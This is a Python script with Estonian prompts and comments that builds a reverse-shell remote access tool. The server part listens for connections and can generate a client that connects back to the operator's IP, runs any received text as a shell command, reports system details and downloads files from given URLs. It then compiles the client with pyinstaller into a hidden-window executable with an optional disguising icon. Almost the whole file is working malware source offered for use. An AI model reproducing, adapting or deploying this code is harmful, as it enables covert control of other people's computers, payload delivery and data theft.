import socket
import sys
import getopt
import os
from shutil import rmtree

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = input("Kohalik IP: ")
port = input("Port: ")
port = int(port)
#Küsib kas kasutaja tahab teha kliendi, see on kasulik kui kasutajal pole klienti tehtud ja ta soovib, et masin
#teeks seda tema jaoks
userAsk = input("Kas soovid teha clienti?[Y/N] ")
if userAsk == "Y" or userAsk == "y":
   if os.path.isfile("client.pyw"):
      os.remove("client.pyw")
   clientMake = open("client.txt", "w")
   clientMake.write("""
import socket
import os
import requests
from platform import *

s = socket.socket(socket.SOCK_STREAM)
host = """+'"'+host+'"'+"""
port = """+str(port)+"""

s.connect((host, port))

while True:
    data = s.recv(4096).decode()
    if data == "os":
        s.send("CPU: {}, OS: {} {}, Machine name: {}".format(machine(),system(),release(),node()).encode())
        data = ""
    if data[:5] == "ssend":
        s.send("Saadan faili".encode())
        url = data[6:]
        r = requests.get(url, allow_redirects=True)
        if url.find('/'):
            urlName = url.rsplit('/', 1)[1]
        open(urlName, 'wb').write(r.content)
        data = ""
    output = os.popen(data).read()
    if not output:
        s.send("\\n".encode())
    s.send(output.encode())

print("Uhendus katkes")
""")
   clientMake.close()
   os.rename("client.txt", "client.pyw")
   iconAsk = input("Kas soovid failile ikooni?[Y/N] ")
   if iconAsk == "Y" or iconAsk == "y":
      urlAsk = input("Sisesta ikooni nimi: ")
   else:
      urlAsk = ""
   if os.path.isdir("build") or os.path.isdir("__pycache__") or os.path.isdir("dist") or os.path.isfile("client.exe"):
      try:
         rmtree("build")
      except:
         pass
      try:
         rmtree("__pycache__")
      except:
         pass
      try:
         rmtree("dist")
         os.rmdir("dist")
      except:
         pass
      try:
         os.remove("client.exe")
      except:
         pass
   print("Genereerin exe faili")
   if len(urlAsk) <= 0:
      os.system("pyinstaller -F -w client.pyw")
   if len(urlAsk) > 0:
      os.system("pyinstaller -F -w -i", urlAsk, " client.pyw")
   if os.path.isdir("build") or os.path.isdir("__pycache__") or os.path.isdir("dist"):
      try:
         rmtree("build")
      except:
         pass
      try:
         rmtree("__pycache__")
      except:
         pass
      os.rename("dist/client.exe", "client.exe")
      try:
         rmtree("dist")
         os.rmdir("dist")
      except:
         pass
   print("Exe fail genereeritud!")
                    
s.bind((host, port))

s.listen(5)
c = None

while True:
   #vaatab, kas ühendus on juba saadaval
   if c is None:
       print("Ootan uhendust...")
       c, addr = s.accept()
       print('Uhendasin', addr)
       print("Kirjuta 'os', et näha informatsiooni juhitava arvuti kohta")
       print("Kirjuta 'ssend:[url]', et saata fail internetist")
       #kui ühendus on saadaval, siis võib kood alata
   else:
      q = input("$ ")
      c.send(q.encode())
      data = c.recv(4096).decode()
      print(data)
      #kui klient saadab nõusoleku, et fail on saadetud, prindi see nõusolek ekraanile
      if data == "Saadan faili":
         print("Fail saadetud!")
